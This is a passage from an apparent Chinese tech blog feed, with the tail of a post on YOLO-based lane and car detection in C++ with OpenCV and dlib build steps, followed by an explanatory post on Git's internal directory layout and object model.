	cv::putText(inputImage, turn, cv::Point(50, 90), cv::FONT_HERSHEY_COMPLEX_SMALL, 3, cvScalar(0, 255, 0), 1, CV_AA);

	cv::namedWindow(&quot;Lane&quot;, CV_WINDOW_AUTOSIZE);
	cv::imshow(&quot;Lane&quot;, inputImage);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;yolo_car_detect.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-04-17 14:28:03 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-04-18 12:12:02
 */
#include &amp;lt;opencv2/dnn.hpp&amp;gt;
#include &amp;lt;opencv2/imgproc.hpp&amp;gt;
#include &amp;lt;opencv2/highgui.hpp&amp;gt;
#include &amp;lt;fstream&amp;gt;
#include &amp;lt;sstream&amp;gt;
#include &amp;lt;vector&amp;gt;

using namespace cv;
using namespace dnn;
using namespace std;

//置信度
float confThreshold = 0.5;
float nmsThreshold = 0.4;

//图片输入尺寸
//参看cfg配置文件
int inpWidth = 416;  
int inpHeight = 416; 
//配置文件
const string classesFile = &quot;../config/coco.names&quot;;
const string modelConfiguration = &quot;../config/yolov3-tiny.cfg&quot;;
const string modelWeights = &quot;../config/yolov3-tiny.weights&quot;;
//测试视频
cv::Mat img_denoise;
cv::Mat img_edges;
cv::Mat img_mask;
std::vector&amp;lt;cv::Vec4i&amp;gt; lines;
std::vector&amp;lt;std::vector&amp;lt;cv::Vec4i&amp;gt; &amp;gt; left_right_lines;
std::vector&amp;lt;cv::Point&amp;gt; lane;
std::string turn;
int flag_plot = -1;
int i = 0;
vector&amp;lt;string&amp;gt; classes;
// 删除置信度低的图片
void postprocess(Mat&amp;amp; frame, const vector&amp;lt;Mat&amp;gt;&amp;amp; out);

//画预测框
void drawPred(int classId, float conf, int left, int top, int right, int bottom, Mat&amp;amp; frame);

//获取分类
vector&amp;lt;String&amp;gt; getOutputsNames(const Net&amp;amp; net);

//config检测
size_t configFileDect()
{
	if(classesFile == NULL)
	{
		fprintf(stdout,&quot;classesFile is NULL\n&quot;);
		return 1;
	}
	if(modelConfiguration == NULL)
	{
		perror(&quot;modelConfiguration&quot;);
		return 1;
	}
	if(modelWeights == NULL)
	{
		perror(&quot;modelWeights&quot;);
		return 1;
	}
}


//抑制低置信度
void postprocess(Mat&amp;amp; frame, const vector&amp;lt;Mat&amp;gt;&amp;amp; outs)
{
    vector&amp;lt;int&amp;gt; classIds;
    vector&amp;lt;float&amp;gt; confidences;
    vector&amp;lt;Rect&amp;gt; boxes;
    // 遍历每一个box
    for (size_t i = 0; i &amp;lt; outs.size(); ++i)
    {
        float* data = (float*)outs[i].data;
        for (int j = 0; j &amp;lt; outs[i].rows; ++j, data += outs[i].cols)
        {
            Mat scores = outs[i].row(j).colRange(5, outs[i].cols);
            Point classIdPoint;
            double confidence;
            //获取score最大和最小值
            minMaxLoc(scores, 0, &amp;amp;confidence, 0, &amp;amp;classIdPoint);
            if (confidence &amp;gt; confThreshold)
            {
                int centerX = (int)(data[0] * frame.cols);
                int centerY = (int)(data[1] * frame.rows);
                int width = (int)(data[2] * frame.cols);
                int height = (int)(data[3] * frame.rows);
                int left = centerX - width / 2;
                int top = centerY - height / 2;
                
                classIds.push_back(classIdPoint.x);
                confidences.push_back((float)confidence);
                boxes.push_back(Rect(left, top, width, height));
            }
        }
    }
    
    vector&amp;lt;int&amp;gt; indices;
    NMSBoxes(boxes, confidences, confThreshold, nmsThreshold, indices);
    for (size_t i = 0; i &amp;lt; indices.size(); ++i)
    {
        int idx = indices[i];
        Rect box = boxes[idx];
        drawPred(classIds[idx], confidences[idx], box.x, box.y,
                 box.x + box.width, box.y + box.height, frame);
    }
}

//绘画渲染
void drawPred(int classId, float conf, int left, int top, int right, int bottom, Mat&amp;amp; frame)
{
    //矩形框
    rectangle(frame, Point(left, top), Point(right, bottom), Scalar(0, 255, 0), 3);
    
    //获取name和置信度
    string label = format(&quot;%.2f&quot;, conf);
    if (!classes.empty())
    {
        CV_Assert(classId &amp;lt; (int)classes.size());
        label = classes[classId] + &quot;:&quot; + label;
    }
    //说明
    int baseLine;
    Size labelSize = getTextSize(label, FONT_HERSHEY_SIMPLEX, 0.5, 1, &amp;amp;baseLine);
    top = max(top, labelSize.height);
    rectangle(frame, Point(left, top - round(1.5*labelSize.height)), Point(left + round(1.5*labelSize.width), top + baseLine), Scalar(255, 255, 255), FILLED);
    putText(frame, label, Point(left, top), FONT_HERSHEY_SIMPLEX, 0.75, Scalar(0,0,0),1);
}
//获取name
vector&amp;lt;String&amp;gt; getOutputsNames(const Net&amp;amp; net)
{
    static vector&amp;lt;String&amp;gt; names;
    if (names.empty())
    {
        vector&amp;lt;int&amp;gt; outLayers = net.getUnconnectedOutLayers();
        //获取所有name
        vector&amp;lt;String&amp;gt; layersNames = net.getLayerNames();
        //获取当前的name
        names.resize(outLayers.size());
        for (size_t i = 0; i &amp;lt; outLayers.size(); ++i)
        names[i] = layersNames[outLayers[i] - 1];
    }
    return names;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;安装使用&quot;&gt;安装使用&lt;/h1&gt;

&lt;h2 id=&quot;opencv配置&quot;&gt;opencv配置&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;建议使用3.4.5版本,其中 dnn 模块支持较好.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;下载链接&lt;/li&gt;
  &lt;li&gt;解压&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;unzip opencv- . . .zip
cd opencv- 3.4.5
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;安装cmake&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo apt-get install cmake
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;依赖环境&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo apt-get install build-essential libgtk . -dev libavcodec-dev libavformat-dev libjpeg-dev libswscale-
dev libtiff -dev
sudo apt-get install libgtk . -dev
sudo apt-get install pkg-config
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;建立build&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mkdir build
cd build
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;cmake&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo cmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/local ..
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;编译&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo make -j8
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;安装&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo make install
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;配置环境&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo gedit /etc/ld.so.conf
#添加 /usr/loacal/lib
sudo gedit /etc/bash.bashrc
#在文件末尾加入:
#PKG_CONFIG_PATH=$PKG_CONFIG_PATH:/usr/local/lib/pkgconfig
#export PKG_CONFIG_PATH
source /etc/bash.bashrc
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;dlib配置&quot;&gt;Dlib配置&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;安装libboost&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo apt-get install libboost-all-dev
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;下载dlib&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;git clone https://github.com/davisking/dlib.git
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;build&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cd dlib
mkdir build; cd build; cmake .. -DDLIB_USE_CUDA=0 -DUSE_AVX_INSTRUCTIONS=1; cmake --build .
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;-DDLIB_USE_CUDA=0 不使用cuda&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;-DUSE_AVX_INSTRUCTIONS=1 使用cpu的AVX加速&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;python扩展&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cd ..
python setup.py install --yes USE_AVX_INSTRUCTIONS --no DLIB_USE_CUDA
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;编译程序&quot;&gt;编译程序&lt;/h2&gt;

&lt;h3 id=&quot;fatiguedrivingdetection&quot;&gt;FatigueDrivingDetection&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cd FatigueDrivingDetection
mkdir build
cd build/
cmake .. -DCMAKE_BUILD_TYPE=Release | tee ../log/cmake_log
make -j |tee ../log/make_log
chmod +x FatigueDrivingDe
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;lane_car_detect-1&quot;&gt;lane_car_detect&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cd lane_car_detect/
mkdir build
cd build
cmake ..
make
chmod +x lane_car_detect
./lane_car_detect
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="机器学习" /><summary type="html">[toc]</summary></entry><entry><title type="html">Git实现原理</title><link href="http://localhost:4000/_posts/2020-06-30-git%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/" rel="alternate" type="text/html" title="Git实现原理" /><published>2020-06-30T00:00:00+08:00</published><updated>2020-06-30T00:00:00+08:00</updated><id>http://localhost:4000/_posts/git%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-30-git%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/">&lt;p&gt;title:git实现原理
tags: git&lt;/p&gt;

&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;git 常用命令参考此篇&lt;a href=&quot;/_posts/2020-05-08-git常用命令.md&quot;&gt;文章&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;git目录&quot;&gt;&lt;strong&gt;Git目录&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;&lt;code&gt;Git&lt;/code&gt;目录是项目存储所有历史和元信息的目录 - 包括所有的对象(&lt;strong&gt;&lt;em&gt;commits,trees,blobs,tags&lt;/em&gt;&lt;/strong&gt;).&lt;/p&gt;

&lt;p&gt;每一个项目只能有一个’Git目录’(这和SVN,CVS的每个子目录中都有此类目录相反),　Git目录是项目的根目录下的一个名为 &lt;strong&gt;*.git*&lt;/strong&gt; 的隐藏目录. 如果你查看这个目录的内容, 你可以看到所有的重要文件。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$cd .git ; tree -L 1
|-- HEAD # 记录当前处在哪个分支里
|-- config # 项目的配置信息，git config命令会改动它
|-- description # 项目的描述信息
|-- hooks/ # 系统默认钩子脚本目录
|-- index # 索引文件
|-- logs/ # 各个refs的历史信息
|-- objects/ # Git本地仓库的所有对象 (commits, trees, blobs, tags)
|-- refs/ # 标识每个分支指向了哪个提交(commit)。
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;工作目录&quot;&gt;&lt;strong&gt;工作目录&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Git的 ‘&lt;em&gt;工作目录&lt;/em&gt;’ 存储着你现在签出(checkout)来用来编辑的文件. 当你在项目的不同分支间切换时,  工作目录里的文件经常会被替换和删除. 所有历史信息都保存在 ‘Git目录’中 ;　工作目录只用来临时保存签出(checkout) 文件的地方,  你可以编辑工作目录的文件直到下次提交(commit)为止&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;‘&lt;em&gt;工作目录&lt;/em&gt;‘包括在项目目录下，除了 &lt;strong&gt;.git&lt;/strong&gt; 外的其他所有文件和目录&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;git目录详解&quot;&gt;&lt;strong&gt;.git目录详解&lt;/strong&gt;&lt;/h1&gt;

&lt;h2 id=&quot;head文件&quot;&gt;&lt;strong&gt;HEAD&lt;/strong&gt;文件&lt;/h2&gt;

&lt;p&gt;HEAD文件就是一个只有一行信息的纯文本文件。这行内容记录的是当前头指针的引用，通常是指向一个分支的引用 ，有时也是一个提交(commit)的SHA值&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ cat .git/HEAD
ref: refs/heads/master #HEAD文件的内容只有这一行，表明当前处于master分支
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;config文件&quot;&gt;&lt;strong&gt;config文件&lt;/strong&gt;&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;config文件记录着项目的配置信息，也是一个普通的纯文本文件。git config命令会改动它(当然也可以手工编辑)。 
这个文件里面配置了当前这个版本库的基本属性信息，上游版本库信息，本地分支与上游的映射关系，命令别名等。
总之是一个很有用的文件。在你的.git目录里看到的config文件内容基本上是下面的样子。
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-reStructuredText&quot;&gt;#基本配置`
`[core]`
 `repositoryformatversion = 0`
 `filemode =` `true`
 `bare =` `false`
 `logallrefupdates =` `true`
 `ignorecase =` `true`
 `precomposeunicode =` `true`
`#上游版本库`
`[remote` `&quot;origin&quot;]`
 `url = http://git.dangdang.com/stock/shopstock-update.git`
 `fetch = +refs/heads/*:refs/remotes/origin/*`
`#本地分支与上游版本库分支的映射`
`[branch` `&quot;master&quot;]`
 `remote = origin`
 `merge = refs/heads/master`
`#当前仓库Git命令别名`
`[alias]`
 `st = status
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Icon如果没有添加远程版本库，[remote “origin”]和[branch “master”]是不存在的；如果没有设置alias那么[alias]也是不存在的。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-reStructuredText&quot;&gt;所以如果仅仅是git init之后的一个本地仓库，那么只有[core]配置项 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;hooks目录&quot;&gt;&lt;strong&gt;hooks目录&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;钩子(hooks)是一些在.git/hooks目录的脚本, 在被特定的事件触发后被调用。当git init命令被 调用后,  一些非常有用的示例钩子脚本被拷到新仓库的hooks目录中; 但是在默认情况下它们是不生效的。 把这些钩  子文件的”.sample”文件名后缀去掉就可以使它们生效。知道这个目录的用途就好，一般用不到。&lt;/p&gt;

&lt;h2 id=&quot;index文件&quot;&gt;&lt;strong&gt;index文件&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;it暂存区存放index文件中，所以我们把暂存区有时也叫作索引（index）。索引是一个二进制格式的文件，里面存放了与当前暂存内容相关的信息，包括暂存的文件名、文件内容的SHA1哈希串值和文件访问权限。暂存区是贯穿于整个Git使用流程的重要概念，所以index文件就很重要。由于是二进制所以我们无法查看具体内容，但是可以用&lt;code&gt;git ls-files --stage&lt;/code&gt; 命令查看暂存区里面的文件&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$git ls-files --stage`
`100644 44601d12328ea8e04367337184dcccb85859610e 0    README.md
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;objects目录&quot;&gt;&lt;strong&gt;objects目录&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;Git对象(blob,tree,commit,tag)都保存在objects目录里面，所以objects目录就是真正的仓库。objects里面的目录结构组织的很有特点，是以SHA值的前2位作为目录，后38位作为这个目录下的文件名。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$tree objects/
objects/
├── 44
│ └── 601d12328ea8e04367337184dcccb85859610e
├── dd
│ └── 981999876726a1d31110479807e71bba979c44
├── e7
│ └── 77199b859e8e98db46e4897dc7076d07866042
├── info
└── pack
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们的工作目录里的所有文件，代码、库文件、图片等都会变成git对象存在这个objects目录下。每个文件都是一个二进制文件。可以通过 &lt;strong&gt;&lt;em&gt;git cat-file -p&lt;/em&gt;&lt;/strong&gt; SHA值来查看文件的内容。&lt;/p&gt;

&lt;h2 id=&quot;refs目录&quot;&gt;&lt;strong&gt;refs目录&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;refs目录下面是一些纯文本文件，分别记录着本地分支和远程分支的&lt;strong&gt;&lt;em&gt;SHA&lt;/em&gt;&lt;/strong&gt;哈希值。文件的数量取决于分支的数量。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$tree refs
refs
├── heads
│ ├── develop # 记录本地develop分支的SHA哈希值
│ └── master # 记录本地master分支的SHA哈希值
├── remotes
│ └── origin
│ ├── develop # 记录远程版本库develop分支的SHA哈希值
│ └── master # 记录远程版本库master分支的SHA哈希值
└── tags
└── v1.0 # 记录里程碑V1.0的SHA哈希值
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;回想前面介绍的 &lt;strong&gt;HEAD文件&lt;/strong&gt;， HEAD文件的内容记录了当前处于哪个分支，值是 ref: refs/heads/master 。&lt;/p&gt;

&lt;p&gt;而 refs/heads/master文件 记录了master分支的最新提交的SHA哈希值 ，Git就是通过HEAD文件和refs/heads下面的文件来判断当前分支及分支最新提交的。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$cat HEAD
ref: refs/heads/master # 说明当前处于master分支

$cat refs/heads/master
dd981999876726a1d31110479807e71bba979c44 # master分支的最新提交SHA哈希值
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;logs目录&quot;&gt;&lt;strong&gt;logs目录&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;logs目录下面是几个纯文本文件，分别保存着HEAD文件和refs文件内容的历史变化。由于HEAD文件和refs文件的内容就是SHA值，所以log文件的内容就是这些SHA值的变化历史。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$tree logs
logs
├── HEAD
└── refs
├── heads
│ ├── develop
│ └── master
└── remotes
└── origin
├── develop
└── master
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;logs目录的结构和refs几乎一样，只不过每个纯文本文件记录的HEAD文件和分支文件内容的变化日志,也就是SHA哈希值的变更日志。在实际使用中，我们经常需要把代码整体回滚到一个历史状态，这是需要用到 &lt;strong&gt;*git reflog*&lt;/strong&gt; 命令，这个命令其实就是读取的logs目录里的日志文件。就是这么简单。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$cat logs/HEAD
0000000000000000000000000000000000000000 dd981999876726a1d31110479807e71bba979c44 tianle &amp;lt;tianle@dangdang.com&amp;gt; 1493982048 +0800 commit (initial): init repo and add README.md
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;由于目前为止我们的例子只有一个提交(commit) , 所以只有一个日志记录&lt;/p&gt;

&lt;h1 id=&quot;git对象存储及管理&quot;&gt;Git对象存储及管理&lt;/h1&gt;

&lt;h2 id=&quot;sha&quot;&gt;&lt;strong&gt;SHA&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;所有用来表示项目历史信息的文件,是通过一个40个字符的“对象名”来索引的，对象名看起来像这样:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;dd981999876726a1d31110479807e71bba979c44&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;你会在Git里到处看到这种“40个字符”字符串。每一个“对象名”都是对“对象”内容做SHA1哈希计算得来的。&lt;/p&gt;

&lt;p&gt;这样就意味着两个不同内容的对象不可能有相同的“对象名”&lt;/p&gt;

&lt;p&gt;这样做会有几个好处：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Git只要比较对象名，就可以很快的判断两个对象是否相同。&lt;/li&gt;
  &lt;li&gt;因为在每个仓库（repository）的“对象名”的计算方法都完全一样，如果同样的内容存在两个不同的仓库中，就会存在相同的“对象名”下,节省空间。&lt;/li&gt;
  &lt;li&gt;Git还可以通过检查对象内容的SHA1的哈希值和“对象名”是否相同，来判断对象内容是否正确。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;在unix like 系统中，可以通过 &lt;strong&gt;&lt;em&gt;sha1sum*** 命令对一个内容生成摘要。消息摘要算法主要有两种，分别是**MD5**和**SHA**。SHA又可以细分为&lt;/em&gt;SHA-1,SHA-256,SHA-384,SHA-512&lt;em&gt;等算法，不同的算法会生成不同比特大小的哈希值。&lt;/em&gt;&lt;/strong&gt;sha1sum*** 这个从名字上可以看出，用的是sha1 summary算法。git生成SHA哈希值用的就是&lt;strong&gt;*SHA1*&lt;/strong&gt;算法。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$printf` `'dangdang'` `| sha1sum`
`19dd09a3502f4d118893eaefbeab0dfc177e0b7a  - ` `#这就是 'dangdang'通过SHA1算法生成的摘要
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;SHA1是一种密码学的信息摘要算法&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;对象&quot;&gt;&lt;strong&gt;对象&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;每个对象(object) 包括三个部分：类型，大小和内容。大小就是指内容的大小，内容取决于对象的类型，Git有四种类型的对象：” &lt;strong&gt;blob&lt;/strong&gt;“、” &lt;strong&gt;tree&lt;/strong&gt;“、 “ &lt;strong&gt;commit&lt;/strong&gt;” 和” &lt;strong&gt;tag&lt;/strong&gt;”&lt;/p&gt;

&lt;h2 id=&quot;blob&quot;&gt;&lt;strong&gt;BLOB&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;用来存储文件数据，通常是一个文件&lt;/p&gt;

&lt;h2 id=&quot;tree&quot;&gt;&lt;strong&gt;TREE&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;“tree”有点像一个目录，它管理一些“tree”或是 “blob”（就像文件和子目录）&lt;/p&gt;

&lt;h2 id=&quot;commit&quot;&gt;&lt;strong&gt;COMMIT&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;一个“commit”只指向一个”tree”，它用来标记项目某一个特定时间点的状态。它包括一些关于时间点的元数据，如时间戳、最近一次提交的作者、指向上次提交（commits）的指针等等。&lt;/p&gt;

&lt;h2 id=&quot;tag&quot;&gt;&lt;strong&gt;TAG&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;一个“tag”是来标记某一个提交(commit) 的方法。&lt;/p&gt;

&lt;p&gt;几乎所有的Git功能都是使用这四个简单的对象类型来完成的。它就像是在你本机的文件系统之上构建一个小的文件系统。这个小型的文件系统就是 &lt;strong&gt;.git/objects&lt;/strong&gt;目录。&lt;/p&gt;

&lt;h1 id=&quot;与svn的区别&quot;&gt;&lt;strong&gt;与SVN的区别&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Git与你熟悉的大部分版本控制系统的差别是很大的。也许你熟悉Subversion、CVS、Perforce、Mercurial 等等，他们使用  “增量文件系统” （Delta Storage systems）,  就是说它们存储每次提交(commit)之间的差异。Git正好与之相反，它会把你的每次提交的文件的全部内容（snapshot）都会记录下来。这会是在使用Git时的一个很重要的理念。&lt;/p&gt;

&lt;p&gt;为了更好的说明这4种对象类型，我们现在添加一些文件目录到当前的版本库中。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$mkdir -p script/shell script/perl ; echo '#!/bin/bash' &amp;gt; script/shell/test1.sh ;echo '#!/usr/bin/perl' &amp;gt; script/perl/test2.pl
$git add .
$git commit -m 'add shell and perl scprit.'
$git log
#我们看到现在有了两次commit
commit e6361ed35aa40f5bae8bd52867885a2055d60ea2
Author: tianle &amp;lt;tianle@dangdang.com&amp;gt;
Date: Wed May 10 11:07:52 2017 +0800
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;add shell and perl scprit
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;commit dd981999876726a1d31110479807e71bba979c44
Author: tianle &amp;lt;tianle@dangdang.com&amp;gt;
Date: Fri May 5 19:00:48 2017 +0800
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;init repo and add README.md
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看一下现在的工作目录&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$tree
.
├── README.md
└── script
├── perl
│ └── test2.pl
└── test1.sh
2 directories, 3 files
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;blob对象&quot;&gt;&lt;strong&gt;Blob对象&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;blob对象通常用来存储文件的内容&lt;/p&gt;

&lt;p&gt;可以使用 &lt;strong&gt;&lt;em&gt;git show*** 或 **&lt;/em&gt;git cat-file -p*&lt;/strong&gt; 命令来查看一个blob对象里的内容。&lt;/p&gt;

&lt;p&gt;因为blob对象内容全部都是数据，如两个文件在一个目录树中有同样的数据内容，那么它们将会共享同一个blob对象，也就是说同样一份数据内容git只存储一个blob对象。Blob对象和其所对应的文件所在路径、文件名是否改被更改都完全没有关系。&lt;/p&gt;

&lt;p&gt;可以通过 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//git-scm.com/docs/git-hash-object&quot;&gt;git hash-object&lt;/a&gt; 命令生成文件的SHA哈希值,如果加上 &lt;strong&gt;-w&lt;/strong&gt; 参数，会把这个文件生成blob对象并写入对象库。 &lt;strong&gt;hash-object&lt;/strong&gt; 命令是个Git比较底层的命令，平时正常使用Git几乎用不到。&lt;/p&gt;

&lt;p&gt;Icon不需要写完整40位的SHA哈希值，只写前7位就可以&lt;/p&gt;

&lt;h1 id=&quot;tree-对象&quot;&gt;&lt;strong&gt;Tree&lt;/strong&gt; &lt;strong&gt;对象&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;一个tree对象有一串(bunch)指向blob对象或是其它tree对象的指针，它一般用来表示内容之间的目录层次关系。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;git ls-tree&lt;/em&gt;&lt;/strong&gt; 或 &lt;strong&gt;&lt;em&gt;git cat-file -p&lt;/em&gt;&lt;/strong&gt;  命令还可以用来查看tree对象&lt;/p&gt;

&lt;p&gt;一个tree对象包括一串(list)条目，每一个条目包括：mode、对象类型、SHA1值 和名字(这串条目是按名字排序的)。&lt;/p&gt;

&lt;p&gt;它用来表示一个目录树的内容。 
一个tree对象可以指向(reference): 一个包含文件内容的blob对象,  也可以是其它包含某个子目录内容的其它tree对象.  Tree对象、blob对象和其它所有的对象一样，都用其内容的SHA1哈希值来命名的；只有当两个tree对象的内容完全相同（包括其所指向所有子对象）时，它的名字才会一样，反之亦然。这样就能让Git仅仅通过比较两个相关的tree对象的名字是否相同，来快速的判断其内容是否不同。tree对象存储的是指针（tree和blob的SHA哈希值），不存储真正的对象。tree对象可以理解为就是一个目录，目录里包含子目录（tree的SHA值）和文件（blob的SHA值).而SHA值所对应的真正的对象文件存在 .git/objects下面。&lt;/p&gt;

&lt;h1 id=&quot;commit对象&quot;&gt;&lt;strong&gt;Commit对象&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Commit就是提交， “commit对象”指向一个”tree对象”,  这个tree对象就是本次提交所对应的目录树,里面包括这次提交时工作区里面所有的目录和文件的指针，有时也叫做快照。”commit对象”还带有相关的描述信息&lt;/p&gt;

&lt;p&gt;可以用 &lt;strong&gt;&lt;em&gt;git log  -1 –pretty=raw***  或 **&lt;/em&gt;git show -s –pretty=raw*&lt;/strong&gt;  或 &lt;strong&gt;*git cat-file -p*&lt;/strong&gt; &lt;commit&gt;&lt;/commit&gt;&lt;/p&gt;

&lt;p&gt;提交(commit)由以下的部分组成:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;一个&lt;/strong&gt; &lt;strong&gt;tree对象:&lt;/strong&gt; tree对象的SHA1签名, 代表着目录在某一时间点的内容.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
